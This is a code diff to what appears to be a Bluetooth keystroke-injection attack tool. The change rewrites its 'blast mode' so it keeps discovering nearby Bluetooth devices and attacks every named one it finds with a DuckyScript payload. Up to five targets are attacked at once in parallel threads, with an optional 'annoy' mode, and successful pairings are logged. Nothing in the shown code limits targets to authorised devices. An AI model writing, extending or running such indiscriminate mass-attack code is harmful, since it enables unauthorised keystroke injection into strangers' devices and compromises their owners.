@@ -716,11 +716,14 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
         log.error(f"Critical failure during attack on {target_address}: {e}")
         return False
 
-def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, is_annoy_mode=False):
-    """Refined Blast Mode: Automated targeting with persistent discovery."""
+from concurrent.futures import ThreadPoolExecutor
+
+def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, is_annoy_mode=False, max_workers=5):
+    """Refined Blast Mode: Automated targeting with parallel execution."""
     print(AnsiColorCode.CYAN + "\n" + "="*50)
-    print(f"B L A S T  M O D E  A C T I V E")
+    print(f"B L A S T  M O D E  A C T I V E  (Parallel)")
     print(f"Sub-mode: {'RECON' if recon_only else 'ATTACK'} | Policy: {'ANNOY' if is_annoy_mode else 'ONCE'}")
+    print(f"Concurrency: {max_workers} simultaneous targets")
     print("="*50 + AnsiColorCode.RESET)
     print("[!] Successes are logged to 'paired_devices.txt'")
     print("[!] Automated sequence running. Press Ctrl+C to stop.\n")
@@ -731,60 +734,54 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
     last_heartbeat = time.time()
     
     try:
-        # Populate queue with initial devices if provided
         queue = []
         if initial_devices:
             for addr, name in initial_devices:
                 queue.append((addr, name))
         
-        # Start persistent discovery for new targets
         adapter_path = get_adapter_path(bus, adapter_id)
         adapter_obj = bus.get("org.bluez", adapter_path)
         adapter_obj.StartDiscovery()
         
-        while True:
-            # Heartbeat every 10 seconds if idle
-            if not queue and time.time() - last_heartbeat > 10:
-                print(f"[{time.strftime('%H:%M:%S')}] Still scanning for new targets... (Devices Blasted: {len(blasted_devices)})")
-                last_heartbeat = time.time()
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            while True:
+                if not queue and time.time() - last_heartbeat > 10:
+                    print(f"[{time.strftime('%H:%M:%S')}] Still scanning for new targets... (Total Blasted: {len(blasted_devices)})")
+                    last_heartbeat = time.time()
 
-            # Check for new devices from DBus
-            mngr = bus.get("org.bluez", "/")
-            objs = mngr.GetManagedObjects()
-            
-            for path, interfaces in objs.items():
-                if "org.bluez.Device1" in interfaces:
-                    props = interfaces["org.bluez.Device1"]
-                    name = props.get("Name", props.get("Alias", None))
-                    addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
+                # Refresh discovery objects
+                mngr = bus.get("org.bluez", "/")
+                objs = mngr.GetManagedObjects()
+                
+                for path, interfaces in objs.items():
+                    if "org.bluez.Device1" in interfaces:
+                        props = interfaces["org.bluez.Device1"]
+                        name = props.get("Name", props.get("Alias", None))
+                        addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
+                        
+                        if name and addr not in blasted_devices and not name.startswith("00-00-00"):
+                            if (addr, name) not in queue:
+                                log.info(f"New candidate identified: {name} ({addr})")
+                                queue.append((addr, name))
+
+                # Process queue in parallel
+                futures = []
+                while queue:
+                    addr, name = queue.pop(0)
+                    if addr in blasted_devices: continue
                     
-                    if name and addr not in blasted_devices and not name.startswith("00-00-00"):
-                        # Add to queue if not already there or blasted
-                        if (addr, name) not in queue:
-                            log.info(f"New candidate identified: {name} ({addr})")
-                            queue.append((addr, name))
-
-            # Process queue
-            while queue:
-                addr, name = queue.pop(0)
-                if addr in blasted_devices: continue
-
-                log.notice(f"\n[BLAST] TARGETING: {name} ({addr})")
-                success = perform_attack(addr, adapter_id, duckyscript, is_annoy_mode=is_annoy_mode, recon_only=recon_only, name=name)
+                    blasted_devices.add(addr)
+                    log.notice(f"[BLAST-INIT] Queuing parallel attack: {name} ({addr})")
+                    futures.append(executor.submit(perform_attack, addr, adapter_id, duckyscript, is_annoy_mode, recon_only, name))
                 
-                if success:
-                    log.notice(f"[BLAST] Target {addr} ({name}) SUCCESS.")
-                else:
-                    log.warning(f"[BLAST] Target {addr} ({name}) FAILED/SKIPPED.")
-                
-                blasted_devices.add(addr)
-                last_heartbeat = time.time() # Reset heartbeat after action
-                time.sleep(2) # Cooldown
-            
-            time.sleep(2) # Scan refresh rate
+                # We don't necessarily need to wait for all futures here, 
+                # but we should let the scan loop continue.
+                # However, for terminal visibility, let's keep it somewhat managed.
+                time.sleep(3) 
+                last_heartbeat = time.time()
             
     except KeyboardInterrupt:
-        print("\n[!] Blast Mode stopped.")
+        print("\n[!] Blast Mode stopping... waiting for active threads to finish.")
     finally:
         if adapter_obj:
             try: adapter_obj.StopDiscovery()
